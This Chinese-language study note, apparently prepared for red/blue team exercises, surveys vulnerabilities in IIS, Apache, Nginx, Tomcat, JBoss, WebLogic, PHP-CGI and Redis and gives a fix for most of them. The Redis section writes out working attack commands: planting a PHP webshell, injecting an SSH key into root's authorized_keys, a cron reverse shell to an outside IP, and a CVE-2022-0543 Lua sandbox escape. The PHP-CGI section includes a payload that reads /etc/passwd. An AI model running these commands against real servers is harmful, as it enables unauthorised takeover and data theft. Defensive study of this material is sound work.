# hvv_中间件漏洞


HVV专题--中间件漏洞

<!--more-->

## 中间件：

中间件（Middleware）又称为web服务器或web容器，是提供系统软件和应用软件之间连接的软件，以便于软件各部件之间的沟通。

常见的web中间件：

- IIS
- Apache
- Tomcat
- Nginx
- Jboss
- Weblogic
- WebSphere

## 常见中间件漏洞：

### 0x1 IIS

IIS（Internet Information Services），即互联网信息服务，是由微软公司提供的基于运行Microsoft Windows的互联网基本服务。IIS是一种Web（网页）服务组件，其中包括Web服务器、FTP服务器、NNTP服务器和SMTP服务器，分别用于网页浏览、文件传输、新闻服务和邮件发送等方面。

#### 1、PUT漏洞

IIS Server 在 Web 服务扩展中开启了 WebDAV ，配置了可以写入的权限，造成任意文件上传。
版本： IIS6.0

**修复方法：**关闭WebDAV 和写权限

#### 2、短文件名猜解

IIS的短文件名机制，可以暴力猜解短文件名，访问构造的某个存在的短文件名，会返回404，访问构造的某个不存在的短文件名，返回400。

**修复方法：**
1）升级.net framework

2）修改注册表禁用短文件名功能
快捷键Win+R打开命令窗口，输入regedit打开注册表窗口，找到路径：
HKEY_LOCAL_MACHINE\SYSTEM\CurrentControlSet\Control\FileSystem，将其中的 NtfsDisable8dot3NameCreation这一项的值设为 1，1代表不创建短文件名格式，修改完成后，需要重启系统生效

3）CMD关闭NTFS 8.3文件格式的支持

4）将web文件夹的内容拷贝到另一个位置，如c:\www到d:\w,然后删除原文件夹，再重命名d:\w到c:\www。

#### 3、远程代码执行

在IIS6.0处理PROPFIND指令的时候，由于对url的长度没有进行有效的长度控制和检查，导致执行memcpy对虚拟路径进行构造的时候，引发栈溢出，从而导致远程代码执行。

**修复方法：**

1）关闭 WebDAV 服务

2） 使用相关防护设备

#### 4、解析漏洞

IIS 6.0 在处理含有特殊符号的文件路径时会出现逻辑错误，从而造成文件解析漏洞。

```
/test.asp/test.jpgtest.asp;.jpg
```

**第一种**是新建一个名为 “test.asp” 的目录，该目录中的任何文件都被 IIS 当作 asp 程序执行（特殊符号是 “/” ）
**第二种**是上传名为 “test.asp;.jpg” 的文件，虽然该文件真正的后缀名是 “.jpg”, 但由于含有特殊符号 “;” ，仍会被 IIS 当做 asp 程序执行

IIS7.5 文件解析漏洞

```
test.jpg/.php
```

URL 中文件后缀是 .php ，便无论该文件是否存在，都直接交给 php 处理，而 php 又默认开启 “cgi.fix_pathinfo”, 会对文件进行 “ 修理 ” 

即当 php 遇到路径 “/aaa.xxx/bbb.yyy” 时，若 “/aaa.xxx/bbb.yyy” 不存在，则会去掉最后的 “bbb.yyy” ，然后判断 “/aaa.xxx” 是否存在，若存在，则把 “/aaa.xxx” 当作文件。

若有文件 test.jpg ，访问时在其后加 /.php ，便可以把 “test.jpg/.php” 交给 php ， php 修理文件路径 “test.jpg/.php” 得到 ”test.jpg” ，该文件存在，便把该文件作为 php 程序执行了。

**修复方法：**

1）对新建目录文件名进行过滤，不允许新建包含‘.’的文件
2）曲线网站后台新建目录的功能，不允许新建目录
3）限制上传的脚本执行权限，不允许执行脚本
4）过滤.asp/xm.jpg，通过ISApi组件过滤

### 0x2 Apache

Apache 是世界使用排名第一的Web 服务器软件。它可以运行在几乎所有广泛使用的 计算机平台上，由于其 跨平台 和安全性被广泛使用，是最流行的Web服务器端软件之一。它快速、可靠并且可通过简单的API扩充，将 Perl/ Python等 解释器编译到服务器中。

#### 1、解析漏洞

Apache文件解析漏洞严格来说属于用户配置问题。

Apache默认一个文件可以有多个以点分隔的后缀，当右边的后缀无法识别（不在mime.tyoes内），则继续向左识别，当我们请求这样一个文件：shell.xxx.yyy

```
yyy->无法识别，向左xxx->无法识别，向左
```

php->发现后缀是php，交给php处理这个文件

**修复方法：**将AddHandler application/x-httpd-php .php的配置文件删除。

#### 2、目录遍历

由于配置错误导致的目录遍历

**修复方法：**

修改apache配置文件httpd.conf

找到Options+Indexes+FollowSymLinks +ExecCGI并修改成 Options-Indexes+FollowSymLinks +ExecCGI 并保存；

### 0x3 Nginx

Nginx 是一款 轻量级的 Web 服务器、 反向代理 服务器及 电子邮件（IMAP/POP3）代理服务器，并在一个BSD-like 协议下发行。其特点是占有内存少， 并发能力强，事实上nginx的并发能力确实在同类型的网页服务器中表现较好

#### 1、文件解析

对任意文件名，在后面添加`/`任意文件名`.php`的解析漏洞，比如原本文件名是`test.jpg`，可以添加`test.jpg/x.php`进行解析攻击。

**修复方法：**

1） 将php.ini文件中的cgi.fix_pathinfo的值设为0.这样php在解析1.php/1.jpg这样的目录时，只要1.jpg不存在就会显示404；

2） 将/etc/php5/fpm/pool.d/www.conf中security.limit_ectensions后面的值设为.php

#### 2、目录遍历 

Nginx的目录遍历与Apache一样，属于配置方面的问题，错误的配置可到导致目录遍历与源码泄露。

**修复方法：**

将`/etc/nginx/sites-avaliable/default`里的`autoindex on`改为`autoindex off`

#### 3、CRLF注入

CRLF即“回车+换行”（\r\n）

HTTP Header与HTTP Body时用两个CRLF分隔的，浏览器根据两个CRLF来取出HTTP内容并显示出来。

通过控制HTTP消息头中的字符，注入一些恶意的换行，就能注入一些会话cookie或者html代码，由于Nginx配置不正确，导致注入的代码会被执行。

**修复方法：**

Nginx的配置文件`/etc/nginx/conf.d/error1.conf`修改为使用不解码的url跳转。

#### 4、目录穿越

Nginx反向代理，静态文件存储在`/home/`下，而访问时需要在url中输入`files`，配置文件中`/files`没有用`/`闭合，导致可以穿越至上层目录。

**修复方案：**Nginx的配置文件`/etc/nginx/conf.d/error2.conf`的`/files`使用/闭合。

### 0x4 Tomcat

Tomcat 服务器是一个免费的开放源代码的Web 应用服务器，属于轻量级应用 服务器，在中小型系统和并发访问用户不是很多的场合下被普遍使用，是开发和调试JSP 程序的首选。

可以这样认为，当在一台机器上配置好Apache 服务器，可利用它响应 HTML （ 标准通用标记语言下的一个应用）页面的访问请求。

实际上Tomcat是Apache 服务器的扩展，但运行时它是独立运行的，所以当运行tomcat 时，它实际上作为一个与Apache 独立的进程单独运行的。

#### 1、远程代码执行

Tomcat 运行在Windows 主机上，且启用了 HTTP PUT 请求方法，可通过构造的攻击请求向服务器上传包含任意代码的 JSP 文件，造成任意代码执行。

**影响版本：** Apache Tomcat 7.0.0 – 7.0.81

**修复方法：**

1）检测当前版本是否在影响范围内，并禁用PUT方法。

2）更新并升级至最新版。

#### 2、war后门文件部署

Tomcat 支持在后台部署war文件，可以直接将webshell部署到web目录下。

若后台管理页面存在弱口令，则可以通过爆破获取密码。

**修复方法：**

1）在系统上以低权限运行Tomcat应用程序。创建一个专门的 Tomcat服务用户，该用户只能拥有一组最小权限（例如不允许远程登录）。

2）增加对于本地和基于证书的身份验证，部署账户锁定机制（对于集中式认证，目录服务也要做相应配置）。在CATALINA_HOME/conf/web.xml文件设置锁定机制和时间超时限制。

3）以及针对manager-gui/manager-status/manager-script等目录页面设置最小权限访问限制。

4）后台管理避免弱口令。

### 0x5 jBoss

jBoss是一个基于J2EE的开发源代码的应用服务器。 JBoss代码遵循LGPL许可，可以在任何商业应用中免费使用。JBoss是一个管理EJB的容器和服务器，支持EJB1.1、EJB 2.0和EJB3的规范。但JBoss核心服务不包括支持servlet/JSP的WEB容器，一般与Tomcat或Jetty绑定使用。

#### 1、反序列化漏洞

Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。

**修复方法：**

有效解决方案：升级到JBOSS AS7版本临时解决方案：

1）不需要http-invoker.sar 组件的用户可直接删除此组件；

2）用于对 httpinvoker 组件进行访问控制。

#### 2、war后门文件部署

jBoss后台管理页面存在弱口令，通过爆破获得账号密码。登陆后台上传包含后门的war包。

### 0x6 WebLogic

WebLogic是美国Oracle公司出品的一个`application server`，确切的说是一个基于JAVAEE架构的[中间件](https://cloud.tencent.com/product/tdmq?from=20065&from_column=20065)，WebLogic是用于开发、集成、部署和管理大型分布式Web应用、网络应用和[数据库](https://cloud.tencent.com/solution/database?from=20065&from_column=20065)应用的Java应用服务器。将Java的动态功能和Java Enterprise标准的安全性引入大型网络应用的开发、集成、部署和管理之中。

#### 1、反序列化漏洞

Java序列化，简而言之就是把java对象转化为字节序列的过程。而反序列话则是再把字节序列恢复为java对象的过程，然而就在这一转一变得过程中，程序员的过滤不严格，就可以导致恶意构造的代码的实现。

**修复方法：**

1）升级Oracle 10月份补丁。

2）对访问wls-wsat的资源进行访问控制。

#### 2、SSRF

Weblogic 中存在一个SSRF漏洞，利用该漏洞可以发送任意HTTP请求，进而攻击内网中redis、fastcgi等脆弱组件。

**修复方法：**

方法一：

以修复的直接方法是将SearchPublicRegistries.jsp直接删除就好了；

方法二：

1）删除uddiexplorer文件夹

2）限制uddiexplorer应用只能内网访问

方法三：（常用）

Weblogic服务端请求伪造漏洞出现在uddi组件（所以安装Weblogic时如果没有选择uddi组件那么就不会有该漏洞），更准确地说是uudi包实现包uddiexplorer.war下的SearchPublicRegistries.jsp。方法二采用的是改后辍的方式，修复步骤如下：

1）将weblogic安装目录下的wlserver_10.3/server/lib/uddiexplorer.war做好备份

2）将weblogic安装目录下的server/lib/uddiexplorer.war下载

3）用winrar等工具打开uddiexplorer.war

4)将其下的SearchPublicRegistries.jsp重命名为SearchPublicRegistries.jspx

5）保存后上传回服务端替换原先的uddiexplorer.war

6）对于多台主机组成的集群，针对每台主机都要做这样的操作

7）由于每个server的tmp目录下都有缓存所以修改后要彻底重启weblogic（即停应用—停server—停控制台—启控制台—启server—启应用）

#### 3、任意文件上传

通过访问config.do配置页面，先更改Work Home工作目录，用有效的已部署的Web应用目录替换默认的存储JKS Keystores文件的目录，之后使用”添加Keystore设置”的功能，可上传恶意的JSP脚本文件。

**修复方法：**

方案1：

使用Oracle官方通告中的补丁链接：

http://www.oracle.com/technetwork/security-advisory/cpujul2018-4258247.html

https://support.oracle.com/rs?type=doc&id=2394520.1

方案2:

1）进入Weblogic Server管理控制台；

2）domain设置中，启用”生产模式”。

#### 4、war后门文件部署

由于WebLogic后台存在弱口令，可直接登陆后台上传包含后门的war包。

**修复方法：**

防火墙设置端口过滤，也可以设置只允许访问后台的IP列表，避免后台弱口令。

### 0x7 FastCGI

#### 未授权访问、命令执行

服务端使用fastcgi协议并对外网开放9000端口，可以构造fastcgi协议包内容，实现未授权访问服务端.php文件以及执行任意命令。

**修复方法：**更改默认端口

### 0x8 PHPCGI

#### 远程代码执行

在apache调用php解释器解释.php文件时，会将url参数传我给php解释器，如果在url后加传命令行开关（例如-s、-d 、-c或-dauto_prepend_file%3d/etc/passwd+-n）等参数时，会导致源代码泄露和任意代码执行。

此漏洞影响php-5.3.12以前的版本，mod方式、fpm方式不受影响。

**修复方法：**

三种方法：

1）升级php版本；（php-5.3.12以上版本）;

2）在apache上做文章，开启url过滤，把危险的命令行参数给过滤掉，由于这种方法修补比较简单，采用比较多吧。

具体做法：

修改http.conf文件，找到增加以下三行

RewriteEngine on

RewriteCond %{QUERY_STRING} ^(%2d|-)[^=]+$ [NC]

RewriteRule ^(.*) $1? [L]

重启一下apache即可，但是要考虑到，相当于每次request就要进行一次url过滤，如果访问量大的话，可能会增加apache的负担。

3）打上php补丁。

补丁下载地址:https://eindbazen.net/2012/05/php-cgi-advisory-cve-2012-1823/

### 0x9 Redis 

redis是用ANSI C语言编写、支持网络、可基于内存和可持久化的日志型键值对数据库，是一个**key-value**存储系统。并提供多种语言的API。reids默认端口是**6379**。造成未授权漏洞的原因不是逻辑漏洞，是安全配置未作限制。


#### 1、未授权访问漏洞

redis未授权访问漏洞是由于redis服务器版本较低，默认情况下，会绑定在0.0.0.0:6379，如果没有采用相关的策略，如配置防火墙规则避免其他非信任来源的IP访问，就会将Redis服务暴露在公网上；如果没有设置密码认证（一般为空）的情况下，会导致任意用户可以访问目标服务器下未授权访问Redis以及读取Redis数据。

**漏洞成因**

- redis为4.x/5.x或以前的版本
- redis绑定在0.0.0.0:6379，并且没有添加防火墙规则来避免其他非信任来源ip的访问，直接暴露在公网
- 没有设置密码认证，可以免密码远程登录redis服务

**漏洞危害**

- 攻击者可以通过redis命令向目标服务器写入计划任务，让服务器主动连接攻击者，实现反弹shell，完成对服务器的控制
- 攻击者可以通过redis命令向网站目录写入webshell，完成对目标网站服务器的初步控制。即可以通过redis服务间接利用http服务。
- 当redis以root身份运行时，攻击者可以给root用户写入ssh公钥文件，直接通过ssh远程登录受害服务器

#### 2、redis写入webshell

**redis存在未授权访问**，并且**开启了web服务**，**知道了web目录的路径**，并**具有文件读写增删改查的权限**，即可通过redis在指定的web目录下**写入一句话木马**，用蚁剑连接可达到控制服务器的目的。

```
config set dir /var/www/html/   //切换到网站的根目录
config set dbfilename zcc.php   //在磁盘中生成木马文件
set xxx "\n\n\n<?php @eal($_POST['zcc']);?>\n\n\n"    //写入恶意代码到内存中，这里的\n\n\n代表换行的意思，用redis写入文件的会自带一些版本信息，如果不换行可能会导致无法执行.
save    //将内存中的数据导出到磁盘
```

#### 3、redis写入ssh公钥登录

在数据库中插入一条数据，将本机的公钥作为value，key值随意，然后通过修改数据库的默认路径为**/root/.ssh**和默认的缓冲文件**authorized.keys**，把缓冲的数据保存在文件里，这样就可以在服务器端的**/root/.ssh**下生成一个授权的key。

**写入公钥的前提：**
● Redis服务使用root账号启动
● 成功连接redis
● 服务器开放了SSH服务，而且允许使用密钥登录，并且存在/root/.ssh目录，（安装的openssh只要
将公钥放入到/root/.ssh文件夹中，无需设置 默认就允许使用公钥登录），即可远程写入一个公钥，直接登录远程服务器。
攻击机上创建ssh-rsa密钥，也就是生成key，这里密码搞成空，全部默认即可

```
ssh-keygen -t rsa
config set dir /root/.ssh/
config set dbfilename authorized_keys# set x "\n\n\n公钥\n\n\n"，将公钥写入x键。前后用\n换行，避免和Redis里其他缓存数据混合
set x "\n\n\nssh-rsa AAAAB3NzaC1yc2EAAAADAQABAAABgQDCiRdspB+toUvUw1pvmizU3XUk9tEF8Dvu/u2Ro9wOYlFWL+JsEI8IWbnQY8YenPZStJMQGu0onJML+fM475Prd6llv3gOZL45P07Xv03MqVcrU0BrFxmtXd9fr91Sl5kPNME9A2LrfmWszkELGDn+RJPSTGXvB8yKTJ2TjwP2Bn6RbVCtOpX3bkaCFja4MvjxeDat0yYFRw9SOUE1UEU3jsX0jvIjhjDlcOhOtsHgB3rCyN+U6sY8T9IzmFaw7BjufHEpTiErx5NDOW/FjQsEuX2eCX6w3RxCdso1oceVhG+5VbsorEi01ddSEGubK4ZvMB0/kwJu0e1dozaJZOIKxxxx7zhdVjHb0zJQzbqqzwbMe54dsGerQA1BCnLF/axmt13BNZKXgBIcaxtPx7Ik7ekigjn/T6ldlguZXUup+yI8g8nzJEkI6PFNc+UYl+SY1cqpCmPQv2CGP8FcD++VBmxf0hh8AzO4jdbfZZIqpBqqhtVKeHLXMcV7OXCFM= red@sxxc\n\n\n"
save
```

连接:

```
ssh -i id_rsa root@ip
```

#### 4、写入计划任务反弹shell

原理就是在数据库中插入一条数据，将计划任务的内容作为value，key值随意，然后通过修改数据库的默认路径为目标主机计划任务的路径，把缓冲的数据保存在文件里，这样就可以在服务器端成功写入一个计划任务进行反弹shell。

```
set x "\n\n*/1 * * * * bash -i >& /dev/tcp/43.xx.x7/8089 0>&1\n\n"  //\n为换行符，此处一定要加\n，这样反弹shell语句与其他乱码语句就会分隔开不在同一行，这样才能成功反弹shell
config setdir /var/spool/cron
config set dbfilename root
save
```

反弹shell这里只在centos中能够利用成功，ubuntu系统由于通过redis写入计划任务后乱码原因导致无法反弹成功。

#### 5、主从复制rce

漏洞存在于4.x、5.x版本中，Redis提供了**主从模式**，主从模式指使用一个redis作为主机，其他的作为备份机，主机从机数据都是一样的，从机负责读，主机只负责写，通过读写分离可以大幅度减轻流量的压力，算是一种通过牺牲空间来换取效率的缓解方式。在redis 4.x之后，通过外部拓展可以实现在redis中实现一个新的Redis命令，通过写c语言并编译出.so文件。在两个Redis实例设置主从模式的时候，Redis的主机实例可以通过FULLRESYNC同步文件到从机上。然后在从机上加载恶意so文件，即可执行命令。

**利用前提:**

1.redis 4.x/5.x
2.无需root账号启动redis，普通权限也可以

> **什么是主从复制?**
> 主从复制，是指将一台Redis服务器的数据，复制到其他的Redis服务器。前者称为主节点(master)，后者称为从节点(slave)；数据的复制是单向的，只能由主节点到从节点。
> Redis的持久化使得机器即使重启数据也不会丢失，因为redis服务器重启后会把硬盘上的文件重新恢复到内存中。但是要保证硬盘文件不被删除，而主从复制则能解决这个问题，主redis的数据和从redis上的数据保持实时同步，当主redis写入数据是就会通过主从复制复制到其它从redis

#### 6、ssrf+redis写入webshell

当我们检测出一个网站存在SSRF漏洞的时候，我们就可以探测当前或者内网主机开放的端口，而这些端口往往我们从外网是不能直接探测到的，所以可以尝试利用ssrf探测内网开放的端口，当探测处内网存在redis的时候，则可以尝试进行攻击。

#### 7、Redis Lua 沙盒绕过rce

CVE-2022-0543漏洞影响的版本只限于Debian 和 Debian 派生的 Linux 发行版（如Ubuntu）上的 Redis 服务。

安全研究人员发现在 Debian 上，Lua 由 Redis 动态加载，且在 Lua 解释器本身初始化时，module和require以及package的Lua 变量存在于上游Lua 的全局环境中，而不是不存在于 Redis 的 Lua 上，并且前两个全局变量在上个版本中被清除修复了，而package并没有清楚，所以导致redis可以加载上游的Lua全局变量package来逃逸沙箱。

利用**luaopen_io**函数，执行代码：

```
eval 'local io_l = package.loadlib("/usr/lib/x86_64-linux-gnu/liblua5.1.so.0", "luaopen_io"); 
local io = io_l(); 
local f = io.popen("id", "r"); 
local res = f:read("*a"); 
f:close(); 
return res' 0
```

前提都是需要知道**package.loadlib**的路径。

#### 8、Redis防御

1. 绑定本地和内网ip地址进行访问,如本地ip：127.0.0.1，192.168.54.1
2. requirepass设置redis密码，（默认为空）
3. 保护模式开启protected-mode开启（默认开启）
4. 更改默认端口（6379）
5. 避免使用root权限使用



【参考资料】：

[FreeBuf《Web中间件常见漏洞总结》](https://cloud.tencent.com/developer/article/1423284)

[CSDN《中间件漏洞汇总》](https://blog.csdn.net/weixin_44288604/article/details/121568508)

[redis漏洞利用总结](https://blog.csdn.net/qq_44159028/article/details/127379013?app_version=5.8.1&code=app_1562916241&csdn_share_tail=%7B%22type%22%3A%22blog%22%2C%22rType%22%3A%22article%22%2C%22rId%22%3A%22127379013%22%2C%22source%22%3A%22weixin_52118430%22%7D&uLinkId=usr1mkqgl919blen&utm_source=app)

[SSRF攻击Redis写入webshell](https://blog.csdn.net/qq_44159028/article/details/117034100?ops_request_misc=%257B%2522request%255Fid%2522%253A%2522166599741516800184192907%2522%252C%2522scm%2522%253A%252220140713.130102334.pc%255Fblog.%2522%257D&request_id=166599741516800184192907&biz_id=0&utm_medium=distribute.pc_search_result.none-task-blog-2~blog~first_rank_ecpm_v1~rank_v31_ecpm-1-117034100-null-null.nonecase&utm_term=ssrf%20redis&spm=1018.2226.3001.4450)

